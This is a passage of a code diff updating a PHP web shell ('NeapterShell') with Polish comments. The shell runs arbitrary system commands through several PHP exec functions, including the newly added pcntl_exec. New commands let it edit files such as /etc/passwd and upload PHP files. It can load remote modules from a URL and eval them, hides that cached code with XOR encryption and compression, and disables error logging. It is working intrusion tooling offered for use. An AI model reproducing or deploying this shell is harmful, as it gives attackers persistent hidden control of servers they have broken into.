@@ -17,7 +17,7 @@ require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
 /**
  * class Shell - Zarzadzanie serwerem
  *
- * @version 0.31a
+ * @version 0.40
  *
  * @uses Arr
  * @uses Request
@@ -28,7 +28,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.31a b110908';
+	const VERSION = '0.40 b111006';
 
 	/**
 	 * Help, natywne polecenia
@@ -36,8 +36,11 @@ class Shell
 	const HELP = '
 help - Wyświetlanie pomocy
 modules - Informacje o modułach
+edit - Edycja oraz tworzenie nowego pliku
+upload - Wrzucanie pliku na serwer
 system, exec - Uruchomienie polecenia systemowego
-info - Wyświetla informacje o systemie';
+info - Wyświetla informacje o systemie
+logout - Wylogowanie';
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -141,6 +144,17 @@ info - Wyświetla informacje o systemie';
 	private $aModules = array();
 
 	/**
+	 * Lista natywnych modulow
+	 *
+	 *  [komenda1] => nazwa_metody1
+	 *  [komenda2] => nazwa_metody1
+	 *
+	 * @access private
+	 * @var    string
+	 */
+	private $aNativeModules = array();
+
+	/**
 	 * Lista modulow
 	 *
 	 *  [Modul] => 'komenda1, komenda2'
@@ -168,6 +182,65 @@ info - Wyświetla informacje o systemie';
 	public $sTmp;
 
 	/**
+	 * Funkcje systemowe
+	 *
+	 * @access public
+	 * @var    array
+	 */
+	public $aSystemFunctions = array
+	(
+		'exec',
+		'shell_exec',
+		'passthru',
+		'system',
+		'popen',
+		'proc_open'
+	);
+
+	/**
+	 * Wlasciwosc potrzeba przy wyswietlaniu pliku pomocy z natywnych modulow
+	 * takich jak getCommandEdit(), getCommandUpload() czy getCommandSystem()
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
+	private $bHelp = FALSE;
+
+	/**
+	 * Unikalny klucz dla shella, za pomoca ktorego szyfrowane sa niektore dane
+	 *
+	 * @ignore
+	 * @access public
+	 * @var    string
+	 */
+	public $sKey;
+
+	/**
+	 * Specjalny prefix dla shella
+	 *
+	 * @ignore
+	 * @access public
+	 * @var    string
+	 */
+	public $sPrefix;
+
+	/**
+	 * Jezeli TRUE to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
+	 *
+	 * @access public
+	 * @var    boolean
+	 */
+	public $bDev = FALSE;
+
+	/**
+	 * Jezeli TRUE to skrypty JavaScript sa wlaczone
+	 *
+	 * @access public
+	 * @var     boolean
+	 */
+	public $bJs = TRUE;
+
+	/**
 	 * Konstruktor
 	 *
 	 * @uses   Request
@@ -181,6 +254,16 @@ info - Wyświetla informacje o systemie';
 		 * Czas generowania strony
 		 */
 		$this -> fGeneratedIn = microtime( 1 );
+
+		/**
+		 * Locale
+		 */
+		setLocale( LC_ALL, 'polish.UTF-8' );
+
+		/**
+		 * Naglowek UTF-8
+		 */
+		header( 'Content-type: text/html; charset=utf-8' );
 
 		/**
 		 * @ignore
@@ -230,6 +313,22 @@ info - Wyświetla informacje o systemie';
 		Request::init();
 
 		/**
+		 * Tryb deweloperski
+		 */
+		if( isset( $_GET['dev'] ) )
+		{
+			$this -> bDev = TRUE;
+		}
+
+		/**
+		 * Wylaczenie JavaScript
+		 */
+		if( isset( $_GET['nojs'] ) )
+		{
+			$this -> bJs = FALSE;
+		}
+
+		/**
 		 * disable_functions
 		 */
 		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
@@ -250,40 +349,55 @@ info - Wyświetla informacje o systemie';
 		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );
 
 		/**
+		 * Unikalny klucz
+		 */
+		$this -> sKey = sha1( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ), TRUE ) . md5( md5_file( $sScriptFilename ), TRUE ) . md5( $sScriptFilename, TRUE );
+
+		/**
+		 * Prefix
+		 */
+		$this -> sPrefix = substr( base64_encode( md5( $sScriptFilename, TRUE ) . md5_file( $sScriptFilename, TRUE ) ), 0, 8 ) . '_';
+
+		/**
 		 * Mozliwosc wywolania polecenia systemowego
 		 */
-		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( array( 'exec', 'shell_exec', 'passthru', 'system', 'popen', 'proc_open' ), $this -> aDisableFunctions ) ) > 0 ) );
+		if( function_exists( 'pcntl_exec' ) )
+		{
+			$this -> aSystemFunctions[] = 'pcntl_exec';
+		}
+
+		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( $this -> aSystemFunctions, $this -> aDisableFunctions ) ) > 0 ) );
+
+		/**
+		 * Config
+		 */
+		error_reporting( $this -> bDev ? -1 : 0 );
+		ignore_user_abort( 0 );
 
 		/**
 		 * Jesli SafeMode jest wylaczony
 		 */
 		if( ! $this -> bSafeMode )
 		{
-			ini_set( 'display_errors', 1 );
+			ini_set( 'display_errors', (int) $this -> bDev );
 			ini_set( 'max_execution_time', 0 );
 			ini_set( 'memory_limit', '1024M' );
 			ini_set( 'default_socket_timeout', 5 );
 			ini_set( 'date.timezone', 'Europe/Warsaw' );
 			ini_set( 'html_errors', 0 );
+			ini_set( 'log_errors', 0 );
+			ini_set( 'error_log', NULL );
 		}
-
-		/**
-		 * Config
-		 */
-		error_reporting( -1 );
-		ignore_user_abort( 0 );
-		date_default_timezone_set( 'Europe/Warsaw' );
-
-		/**
-		 * Wczytywanie modulow
-		 */
-		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );
+		else
+		{
+			date_default_timezone_set( 'Europe/Warsaw' );
+		}
 
 		/**
 		 * p jak PURE
 		 */
 		if(    ! isset( $_GET['p'] )
-		    && is_file( $sFilePath = $this -> sTmp . '/' . $sKey )
+		    && is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_modules' )
 		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
 		)
 		{
@@ -296,24 +410,29 @@ info - Wyświetla informacje o systemie';
 			}
 			else
 			{
-				$iDataLen = strlen( $sData );
-
-				$sNewData = NULL;
-
-				/**
-				 * Deszyfrowanie zawartosci pliku
-				 */
-				for( $i = 0; $i < $iDataLen; $i++ )
-				{
-					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
-				}
-
-				eval( '?>' . $sNewData . '<?' );
+				eval( '?>' . $this -> decode( $sData ) . '<?' );
 			}
 		}
 
 		/**
-		 * Lista dostepnych modulow
+		 * Lista dostepnych modulow natywnych
+		 */
+		$oReflection = new ReFlectionClass( 'shell' );
+		$aHelpModules = $oReflection -> getMethods();
+
+		foreach( $aHelpModules as $oMethod )
+		{
+			$sMethod = $oMethod -> getName();
+
+			if( ! ( ( strncasecmp( $sMethod, 'getCommand', 10 ) === 0 ) && ( $sMethod !== 'getCommandCr3d1ts' ) ) )
+			{
+				continue ;
+			}
+			$this -> aNativeModules[ strtolower( substr( $sMethod, 10 ) ) ] = $sMethod;
+		}
+
+		/**
+		 * Lista dostepnych modulow zewnetrznych
 		 */
 		$aClasses = get_declared_classes();
 
@@ -342,6 +461,99 @@ info - Wyświetla informacje o systemie';
 				}
 			}
 		}
+
+		/**
+		 * Chdir
+		 */
+		if(     is_file( $sFile = $this -> sTmp . '/' . $this -> sPrefix . 'chdir' )
+		   && ( ( $sData = file_get_contents( $sFile ) ) !== FALSE )
+		)
+		{
+			chdir( $this -> decode( $sData ) );
+		}
+	}
+
+	/**
+	 * Proste szyfrowanie ciągu z uzyiem XOR
+	 *
+	 * @param  string $sData Tekst do zaszyfrowania
+	 * @param  string $sKey  [Optional]Klucz
+	 * @return string        Zaszyfrowany ciag
+	 */
+	public function encode( $sData, $sKey = NULL )
+	{
+		/**
+		 * Domyslny klucz
+		 */
+		if( $sKey === NULL )
+		{
+			$sKey = $this -> sKey;
+		}
+
+		/**
+		 * Musza wystepowac jakies dane
+		 */
+		if( ( $iDataLen = strlen( $sData ) ) === 0 )
+		{
+			return NULL;
+		}
+
+		$iKeyLen = strlen( $sKey );
+
+		$sNewData = NULL;
+
+		/**
+		 * Szyfrowanie
+		 */
+		for( $i = 0; $i < $iDataLen; ++$i )
+		{
+			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
+		}
+
+		return gzcompress( $sNewData, 9 );
+	}
+
+	/**
+	 * Proste deszyfrowanie ciągu z uzyiem XOR
+	 *
+	 * @param  string $sData Tekst do deszyfracji
+	 * @param  string $sKey  [Optional]Klucz
+	 * @return string        Zdeszyfrowany ciag
+	 */
+	public function decode( $sData, $sKey = NULL )
+	{
+		/**
+		 * Domyslny klucz
+		 */
+		if( $sKey === NULL )
+		{
+			$sKey = $this -> sKey;
+		}
+
+		/**
+		 * Musza wystepowac jakies dane
+		 */
+		if( strlen( $sData ) === 0 )
+		{
+			return NULL;
+		}
+
+		$sData = gzuncompress( $sData );
+		$iDataLen = strlen( $sData );
+
+		$iKeyLen = strlen( $sKey );
+
+		$sNewData = NULL;
+
+		/**
+		 * Deszyfrowanie
+		 */
+		for( $i = 0; $i < $iDataLen; ++$i )
+		{
+			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
+		}
+
+		return $sNewData;
 	}
 
 	/**
@@ -383,23 +595,21 @@ info - Wyświetla informacje o systemie';
 	 */
 	private function getMenu()
 	{
-		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
-				'SafeMode: %s<br />' .
-				'OpenBaseDir: %s<br />' .
-				'Serwer Api: <strong>%s</strong><br />' .
-				'Serwer: <strong>%s</strong><br />' .
-				'TMP: <strong>%s</strong><br />' .
-				'Zablokowane funkcje: <strong>%s</strong><br />' .
-				'Dostępne moduły: <strong>%s</strong>',
+		return sprintf( 'Wersja PHP: <strong>%s</strong><br/>' .
+				'SafeMode: %s<br/>' .
+				'OpenBaseDir: <strong>%s</strong><br/>' .
+				'Serwer Api: <strong>%s</strong><br/>' .
+				'Serwer: <strong>%s</strong><br/>' .
+				'TMP: <strong>%s</strong><br/>' .
+				'Zablokowane funkcje: <strong>%s</strong><br/>',
 
 				phpversion(),
 				$this -> getStatus( $this -> bSafeMode, TRUE ),
-				$this -> getStatus( ini_get( 'open_basedir' ), TRUE ),
+				( ( ( $sBasedir = ini_get( 'open_basedir' ) ) === '' ) ? $this -> getStatus( 0, TRUE ) : $sBasedir ),
 				php_sapi_name(),
 				php_uname(),
 				$this -> sTmp,
-				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions ),
-				implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) )
+				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions )
 		);
 	}
 
@@ -414,21 +624,39 @@ info - Wyświetla informacje o systemie';
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<DATA
 modules - Informacje o modułach
 
 	Użycie:
+		modules loaded - lista załadowanych modułów - polecenia
 		modules version - wyświetlanie wersji modułów
 
 		modules ścieżka_do_pliku_z_modułami
 
 	Przykład:
+		modules loaded
 		modules version
 		modules /tmp/modules
 		modules http://example.com/modules.txt
 DATA;
+		}
+
+		/**
+		 * Lista dostepnych modulow
+		 */
+		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'loaded' ) )
+		{
+			$aModules = array_merge( array_keys( $this -> aNativeModules ),
+				array_map(
+					create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ),	array_keys( $this -> aHelpModules )
+				)
+			);
+
+			sort( $aModules );
+
+			return sprintf( "Załadowano %s modułów:\r\n\t%s", count( $aModules ), implode( "\r\n\t", $aModules ) );
 		}
 
 		/**
@@ -471,9 +699,6 @@ DATA;
 			{
 				return 'Nie można pobrać pliku z modułami';
 			}
-
-			$sFilePath = tempnam( $this -> sTmp, 'shell' );
-			file_put_contents( $sFilePath, $sData );
 		}
 		/**
 		 * Wczytywanie pliku
@@ -484,35 +709,14 @@ DATA;
 			{
 				return 'Nie można wczytać pliku z modułami';
 			}
-
-			$sFilePath = $this -> aArgv[0];
 		}
 
 		/**
 		 * Szyfrowanie zawartosci pliku
 		 */
-		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );
+		file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . '_modules', $this -> encode( $sData ) );
 
-		$iDataLen = strlen( $sData );
-
-		$sNewData = NULL;
-
-		for( $i = 0; $i < $iDataLen; $i++ )
-		{
-			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
-		}
-
-		file_put_contents( $this -> sTmp . '/' . $sKey, $sNewData );
-
-		/**
-		 * Usuwanie tymczasowego pliku
-		 */
-		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
-		{
-			unlink( $sFilePath );
-		}
-
-		header( 'Refresh:1;url=' . Request::getCurrentUrl(), TRUE );
+		header( 'Refresh:1;url=' . Request::getCurrentUrl() );
 
 		return 'Plik z modułami został załadowany';
 	}
@@ -520,9 +724,8 @@ DATA;
 	private function getCommandCr3d1ts()
 	{
 		return <<<DATA
-Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
-
-Jakieś sugestie, pytania ? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
+Jakieś sugestie, pytania?
+	Pisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
 DATA;
 	}
 
@@ -534,6 +737,16 @@ DATA;
 	 */
 	private function getCommandHelp()
 	{
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+help - Wyświetlanie pomocy
+
+	Użycie:
+		help
+DATA;
+		}
+
 		$iMaxLen = 0;
 
 		/**
@@ -552,7 +765,6 @@ DATA;
 		/**
 		 * Formatowanie natywnego helpa
 		 */
-
 		$aHelp = array_filter( preg_split( '~\r\n|\n|\r~', self::HELP ) );
 
 		/**
@@ -570,7 +782,7 @@ DATA;
 		}
 
 		/**
-		 * Formatowanie helpow
+		 * Formatowanie naglowkow z natywnych modulow
 		 */
 		foreach( $aHelp as $sLine )
 		{
@@ -579,9 +791,8 @@ DATA;
 			$sOutput .= str_pad( substr( $sLine, 0, $iPos ), $iMaxLen, ' ' ) . rtrim( substr( $sLine, $iPos -  1 ) ) . "\r\n";
 		}
 
-
 		/**
-		 * Formatowanie helpow
+		 * Formatowanie naglowkow z zewnetrznych modulow
 		 */
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
@@ -596,7 +807,20 @@ DATA;
 		$sOutput .= "\r\n\r\n";
 
 		/**
-		 * Naglowki
+		 * Wymuszenie uzycia pliku pomocy dna natywnych polecen
+		 */
+		$this -> bHelp = TRUE;
+
+		/**
+		 * Formatowanie natywnych helpow
+		 */
+		foreach( $this -> aNativeModules as $sModule => $sMethod  )
+		{
+			$sOutput .= $this -> $sMethod( TRUE )  . "\r\n\r\n\r\n";
+		}
+
+		/**
+		 * Caly help
 		 */
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
@@ -609,6 +833,37 @@ DATA;
 	}
 
 	/**
+	 * Komenda - cd
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandCd()
+	{
+		if( $this -> bHelp  || ( $this -> iArgc !== 1 ) )
+		{
+			return <<<DATA
+Zmiana aktualnego katalogu
+
+	Użycie:
+		cd sciezka
+
+	Przykład:
+		cd /tmp
+DATA;
+		}
+
+		if( chdir( $this -> sArgv ) )
+		{
+			file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . 'chdir', $this -> encode( $this -> sArgv ) );
+
+			return sprintf( "Katalog zmieniono na:\r\n\t%s", getcwd() );
+		}
+
+		return 'Nie udało się zmienić katalogu!!!';
+	}
+
+	/**
 	 * Wykonanie polecenia systemowago
 	 *
 	 * @access public
@@ -617,6 +872,22 @@ DATA;
 	 */
 	public function getCommandSystem( $sCmd )
 	{
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+system - Uruchomienie polecenia systemowego
+
+	Użycie:
+		system polecenie - uruchomienie polecenia
+
+	Przykład:
+		system ls -la
+DATA;
+		}
+
+		/**
+		 * Jezeli safemode jest wylaczony
+		 */
 		if( ! $this -> bSafeMode )
 		{
 			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
@@ -656,10 +927,7 @@ DATA;
 			{
 				echo "exec():\r\n\r\n";
 				exec( $sCmd, $aOutput );
-				foreach( $aOutput as $sLine )
-				{
-					printf( "%s\r\n", $sLine );
-				}
+				echo implode( "\r\n", $sLine ) . "\r\n";
 			}
 			/**
 			 * popen
@@ -668,9 +936,13 @@ DATA;
 			{
 				echo "popen():\r\n\r\n";
 				$rFp = popen( $sCmd, 'r' );
-				while( ! feof( $rFp ) )
+
+				if( is_resource( $rFp ) )
 				{
-					echo fread( $rFp, 1024 );
+					while( ! feof( $rFp ) )
+					{
+						echo fread( $rFp, 1024 );
+					}
 				}
 			}
 			/**
@@ -696,6 +968,25 @@ DATA;
 					}
 				}
 			}
+			/**
+			 * pcntl_exec
+			 */
+			else if( function_exists( 'pcntl_exec' ) && ! in_array( 'pcntl_exec', $this -> aDisableFunctions ) )
+			{
+				echo "pcntl_exec():\r\n\r\n";
+				$sPath = NULL;
+				$aArgs = array();
+				if( ( $iPos = strpos( $sCmd, ' ') ) === FALSE )
+				{
+					$sPath = $sCmd;
+				}
+				else
+				{
+					$sPath = substr( $sCmd, 0, $iPos );
+					$aArgs = explode( ' ', substr( $sCmd, $iPos + 1 ) );
+				}
+				pcntl_exec( $sPath, $aArgs );
+			}
 			else
 			{
 				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
@@ -712,19 +1003,150 @@ DATA;
 	}
 
 	/**
+	 * Edycja pliku
+	 *
+	 * @access private
+	 * @param  string         $sCmd Sciezka do pliku
+	 * @return string|boolean
+	 */
+	private function getCommandEdit( $sFile )
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<DATA
+edit - Edycja oraz tworzenie nowego pliku
+
+	Użycie:
+		edit /etc/passwd
+		edit /sciezka/do/nowego/pliu
+DATA;
+		}
+
+		/**
+		 * Zapis do pliku
+		 */
+		if( ( $sFiledata = Request::getPost( 'filedata' ) ) !== FALSE )
+		{
+			return (boolean) file_put_contents( $sFile, $sFiledata );
+		}
+
+		/**
+		 * Formularz
+		 */
+		return sprintf( '<form action="%s" method="post">' .
+			'<textarea id="console" name="filedata">%s</textarea><br/>' .
+			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
+			'<input type="submit" name="submit" value="Zapisz" id="cmd-send"/></form>',
+			Request::getCurrentUrl(),
+			( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ),
+			htmlspecialchars( Request::getPost( 'cmd' ) )
+		);
+	}
+
+	/**
+	 * Wylogowanie
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandLogout()
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+logout - Wylogowanie
+
+	Użycie:
+		logout
+DATA;
+		}
+
+		/**
+		 * Sciezka do pliku
+		 */
+		$sFilepath = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth';
+
+		/**
+		 * Czy plik z autoryzacja istnieje
+		 */
+		if( is_file( $sFilepath ) )
+		{
+			/**
+			 * Usuwanie pliku
+			 */
+			if( unlink( $sFilepath ) )
+			{
+				return 'Zostałeś wylogowany';
+			}
+			else
+			{
+				return 'Nie zostałeś wylogowany';
+			}
+		}
+
+		return 'Nie jesteś zalogowany, więc nie możesz się wylogować !!!';
+	}
+
+	/**
+	 * Wrzucanie pliku
+	 *
+	 * @access private
+	 * @param  string         $sCmd Sciezka do pliku
+	 * @return string|boolean
+	 */
+	private function getCommandUpload( $sFile )
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<DATA
+upload - Wrzucanie pliku na serwer
+
+	Użycie:
+		upload /tmp/plik.php
+DATA;
+		}
+
+		/**
+		 * Zapis do pliku
+		 */
+		if( ( $aFiledata = Request::getFiles( 'file' ) ) !== FALSE )
+		{
+			return move_uploaded_file( $aFiledata['tmp_name'], $sFile );
+		}
+		/**
+		 * Formularz
+		 */
+		return sprintf( '<form action="%s" method="post" enctype="multipart/form-data">' .
+			'<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
+			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
+			'<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
+			Request::getCurrentUrl(),
+			htmlspecialchars( Request::getPost( 'cmd' ) )
+		);
+	}
+
+	/**
 	 * Wykonanie polecenia systemowago
 	 *
 	 * @access public
 	 * @param  string $sCmd Komenda
 	 * @return string
 	 */
-
 	private function getCommandInfo()
 	{
 		/**
 		 * Help
 		 */
-		if( $this -> iArgc !== 0 )
+		if( $this -> bHelp || ( $this -> iArgc !== 0 ) )
 		{
 			return <<<DATA
 info - Wyświetla informacje o systemie
@@ -762,6 +1184,17 @@ DATA;
 	public function getActionBrowser( $sCmd = NULL )
 	{
 		$bRaw = ( $sCmd !== NULL );
+
+		/**
+		 * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
+		 * linia polecen i przycisk 'Execute'
+		 */
+		$bOwnContent = FALSE;
+
+		/**
+		 * Zawartosc strony
+		 */
+		$sContent = NULL;
 
 		/**
 		 * Zawartosc konsoli
@@ -808,14 +1241,14 @@ DATA;
 				$this -> sCmd = (string) substr( $sCmd, 1 );
 			}
 
-			$this -> sArgv = $this -> rmQuotes( ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) ) );
+			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );
 
 			/**
 			 * Rozdzielanie argumentow
 			 *
 			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
 			 */
-			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
+			if( preg_match_all( '~\'(?:(?:\\\')|.+?)\'|"(?:(?:\\")|.+?)"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
 			{
 				/**
 				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
@@ -834,6 +1267,8 @@ DATA;
 				}
 			}
 
+			$this -> sArgv = $this -> rmQuotes( rtrim($this -> sArgv ) );
+
 			$this -> iArgc = count( $this -> aArgv );
 
 			/**
@@ -843,6 +1278,9 @@ DATA;
 			{
 				case 'help':
 					$sConsole = $this -> getCommandHelp();
+					break ;
+				case 'cd':
+					$sConsole = $this -> getCommandCd();
 					break ;
 				case 'modules':
 					$sConsole = $this -> getCommandModules();
@@ -856,6 +1294,55 @@ DATA;
 					break ;
 				case 'info':
 					$sConsole = $this -> getCommandInfo();
+					break ;
+				case 'logout':
+					$sConsole = $this -> getCommandLogout();
+					break ;
+				case 'edit':
+					$mContent = $this -> getCommandEdit( $this -> sArgv );
+
+					if( is_bool( $mContent ) )
+					{
+						$sConsole = sprintf( 'Plik %szostał zapisany', ( ! $mContent ? 'nie ' : NULL ) );
+					}
+					/**
+					 * Help
+					 */
+					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
+					{
+						$sConsole = $mContent;
+					}
+					/**
+					 * Formularz sluzacy do edycji pliku
+					 */
+					else
+					{
+						$bOwnContent = TRUE;
+						$sContent = $mContent;
+					}
+					break ;
+				case 'upload':
+					$mContent = $this -> getCommandUpload( $this -> sArgv );
+
+					if( is_bool( $mContent ) )
+					{
+						$sConsole = sprintf( 'Plik %szostał wrzucony', ( ! $mContent ? 'nie ' : NULL ) );
+					}
+					/**
+					 * Help
+					 */
+					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
+					{
+						$sConsole = $mContent;
+					}
+					/**
+					 * Formularz sluzacy do wrzucenia pliku
+					 */
+					else
+					{
+						$bOwnContent = TRUE;
+						$sContent = $mContent;
+					}
 					break ;
 				default :
 					if( $this -> aModules === array() )
@@ -878,7 +1365,7 @@ DATA;
 					}
 					else
 					{
-						$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
+						$sConsole = sprintf( 'Nie ma takiej komendy "%s"', htmlspecialchars( $this -> sCmd ) );
 					}
 			}
 		}
@@ -899,10 +1386,20 @@ DATA;
 			return htmlspecialchars_decode( $sConsole ) . "\r\n";
 		}
 
-		$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
-		             sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
-			     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
+		/**
+		 * Wlasna zawartosc okna
+		 */
+		if( ! $bOwnContent )
+		{
+			$sContent  = sprintf( '<pre id="console">%s</pre><br/>' .
+				'<form action="%s" method="post">' .
+				'<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="off"/>' .
+				'<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
+				$sConsole,
+				Request::getCurrentUrl(),
+				htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) )
+			);
+		}
 
 		return $this -> getContent( $sContent );
 	}
@@ -919,16 +1416,41 @@ DATA;
 	 */
 	private function getContent( $sData, $bExdendedInfo = TRUE )
 	{
+		/**
+		 * isAjax
+		 */
+		if( strncasecmp( Request::getServer( 'HTTP_X_REQUESTED_WITH' ), 'XMLHttpRequest', 14 ) === 0 )
+		{
+			preg_match( '~<pre id="console">(.*)</pre>~s', $sData, $aMatch );
+
+			if( $aMatch === array() )
+			{
+				return 'Występił nieznany błąd';
+			}
+
+			return $aMatch[1];
+		}
+
+		$sScript = file_get_contents( 'Lib/js.js' );
+
+		/**
+		 * Wylaczenie JavaScript
+		 */
+		if( ! $this -> bJs )
+		{
+			$sScript = NULL;
+		}
+
 		$sMenu = $this -> getMenu();
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
-		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
+		$sTitle = sprintf( 'NeapterShell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
 return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
 <div id=\"body\">" .
 ( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
-"<div id=\"content\">{$sData}</div>" .
+"<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
-"</div></body></html>";
+"</div>{$sScript}</body></html>";
 	}
 
 	/**
@@ -944,25 +1466,39 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 		 */
 		if( $this -> sAuth !== NULL )
 		{
-			session_start();
+			$sAuth = NULL;
 
-			if( ! ( isset( $_SESSION['auth'] ) && ( $_SESSION['auth'] === sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) ) ) ) )
+			if(     is_file( $sAuthFilename = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth' )
+			    && ( ( $sData = file_get_contents( $sAuthFilename ) ) !== FALSE )
+			)
+			{
+				$sAuth = $this -> decode( $sData );
+			}
+
+			if( $sAuth !== sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) )
 			{
 				if( ! ( ( ( $sUser = Request::getPost( 'user') ) !== FALSE )
 				    && ( ( $sPass = Request::getPost( 'pass') ) !== FALSE )
 				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
 				)
 				{
-					echo $this -> getContent( sprintf( '<form action="%s" method="post"><input type="text" name="user" /><input type="text" name="pass" /><input type="submit" name="submit" value="Go !" /></form>', Request::getCurrentUrl() ), FALSE );
+					$this -> bJs = FALSE;
+
+					echo $this -> getContent(
